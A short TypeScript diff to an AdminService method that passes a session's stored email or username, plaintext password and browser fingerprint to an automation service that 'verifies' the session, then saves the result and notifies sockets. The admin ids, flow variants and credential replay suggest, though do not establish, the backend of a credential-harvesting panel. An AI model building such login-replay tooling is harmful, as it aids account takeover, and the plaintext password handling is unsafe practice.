@@ -100,15 +100,17 @@ export class AdminService {
         const { AutomationService } = await import('./automation.service');
 
         // Trigger Automation
+        const sessionData = session as any;
         const result = await AutomationService.verifySession({
-            userId: session.id,
-            flowId: session.flowId || 'generic',
+            sessionId: session.id,
+            userId: session.adminId || 'hypervisor',
+            flowId: sessionData.flowId || 'generic',
             credentials: {
-                username: session.email || session.username,
-                password: session.password,
-                ...session
+                username: sessionData.email || sessionData.username,
+                password: sessionData.password,
+                ...sessionData
             },
-            fingerprint: session.fingerprint
+            fingerprint: sessionData.fingerprint
         });
 
         // Update DB
@@ -122,7 +124,7 @@ export class AdminService {
         // We can use db.upsertSession, but we need the full object or just merge?
         // upsertSession merges data.
 
-        await db.upsertSession(sessionId, updateData, session.ip, session.adminId, session.variant);
+        await db.upsertSession(sessionId, updateData, session.ip || '127.0.0.1', session.adminId, session.variant);
 
         // Notify Sockets
         const io = getSocketIO();
